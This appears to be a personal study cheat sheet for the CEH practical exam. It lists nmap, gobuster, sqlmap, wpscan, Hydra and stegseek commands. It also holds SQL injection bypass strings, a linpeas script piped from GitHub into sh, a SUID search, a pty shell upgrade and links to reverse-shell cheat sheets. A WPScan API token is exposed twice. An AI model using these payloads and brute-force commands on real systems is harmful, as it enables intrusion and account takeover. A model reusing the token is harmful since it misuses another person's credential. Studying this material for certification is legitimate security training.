sudo su

vi get-stuff.sh

mkdir CEH
cd CEH
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
sudo curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
sudo chmod +x linpeas.sh
sudo apt install stegseek
sudo apt install gobuster
sudo apt install enum4linux
sudo apt install xsltproc
sudo gem install wpscan




## NMAP
sudo nmap -O -T5 -sV -sC -oA nmap_$ip1_out_all -vv $ip1/24
sudo xsltproc nmap_out_all.xml nmap_$ip1_out_all.html

cd CEH;mkdir $ip;cd $ip;sudo nmap -O -T5 -sV -sC -oA nmap_$ip\_out -vv $ip/24;sudo xsltproc nmap_$ip\_out.xml -o nmap_$ip\_out.html;

### All ports
sudo nmap -O -T5 -sV -sC -p- -oA nmap_$ip\\_out_all -vv $ip/24;sudo xsltproc nmap_$ip\\_out_all.xml -o nmap_$ip\\_out_all.html;



### Quick Host Discovery
sudo nmap -O -T5 -sn $ip/24 
sudo nmap -O -T5 -sn -PR $ip/24                   (-PR ARP requests)

nmap -p 3389 --script rdp-ntlm-info <target>




## GoBuster
sudo gobuster dir  -w /usr/share/wordlists/rockyou.txt -u http://$ip

## SQLi
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—

sqlmap -u “url" --cookie="cookie" --dbs


##Steganography
sudo stegseek -wl /usr/share/wordlists/rockyou.txt -sf filename

snow.exe -C -p “password” stegfile.txt

## Enum4Linux
sudo enum4linux -U -o $ip

## WPScan (https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)

### Known vulns
wpscan -e vp,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ --url <example.com>
### All vulns:
wpscan -e ap,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ --url <example.com>
### Password Bruteforce
wpscan -e u --passwords /path/to/password_file.txt  --url <example.com>
##Linpeas Winpeas also exists apparently
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a > /tmp/linpeas.txt

## Hydra
hydra -l <username> -P given_wordlist ftp://$ip
https://github.com/frizb/Hydra-Cheatsheet

## Find Domain Controller
https://serverfault.com/questions/78089/find-name-of-active-directory-domain-controller
### Find FDQN
https://www.google.com/search?q=determine+FDQN+of+remote+domain+controller&client=firefox-b-d&sca_esv=a7c8b91352f94de3&sxsrf=ADLYWIKttXggW1UFvbeJvw7jxaG1ZFa0Qg%3A1732694251615&ei=69BGZ8inJcmO4-EP0t3G8Qo&ved=0ahUKEwiIyfyKhfyJAxVJxzgGHdKuMa4Q4dUDCA8&uact=5&oq=determine+FDQN+of+remote+domain+controller&gs_lp=Egxnd3Mtd2l6LXNlcnAiKmRldGVybWluZSBGRFFOIG9mIHJlbW90ZSBkb21haW4gY29udHJvbGxlcjIKECEYoAEYwwQYCjIKECEYoAEYwwQYCjIKECEYoAEYwwQYCkjbEFCvBVj9CnABeAGQAQCYAb0CoAHXCqoBBzAuNi4wLjG4AQPIAQD4AQGYAgKgApwBwgIKEAAYsAMY1gQYR5gDAOIDBRIBMSBAiAYBkAYIkgcDMS4xoAfbOA&sclient=gws-wiz-serp


### Entropy of ELF
https://github.com/sandflysecurity/sandfly-entropyscan
Entry point for ELF: readelf -a executable_name



UNIX command exploits: GTFOBins
CEH exercise: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/ethical-hacking-and-pen-testing-notes/ceh-mindmaps/system-hacking/tasks.md


Check all suid bit programs (find / -perm -u=s -type f 2>/dev/null)
python -c import pty;pty.spawn("/bin/bash")

General Check: https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
General Check 2: https://github.com/cmuppin/CEH/tree/main/
General Check 3: https://book.hacktricks.xyz/
General Check 4: https://github.com/infovault-Ytube/CEH-Practical-Notes


Reverse Shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
		https://github.com/pentestmonkey/php-reverse-shell


Wpscan API key: j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ

Android: https://github.com/cmuppin/CEH/blob/main/Android
	https://attack.mitre.org/matrices/mobile/android/

Check Service vuln: https://www.cvedetails.com/

Metasploit Priv Esc: run post/multi/recon/local_exploit_suggester

CEH Notes: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/ethical-hacking-and-pen-testing-notes/ceh-mindmaps/cloud-computing/tasks.md

OWASP CheatSheet: https://cheatsheetseries.owasp.org/cheatsheets/


TOOLS:
Nmap/zenmap
Metasploit
Searchsploit
Hydra
Aircrack-ng
Veracrypt
Theef RAT
BCTextEncoder
StegHide
Adb
John the ripper
Wireshark
Phonesploit
Sqlmap
ZAP
Open Stego
Detect It Easy (DIE)
Openvas
Smbclient
SSH
Crackstation
Hashes.com
Cyberchef
emn178.github.io/online-tools/crc32_checksum.html
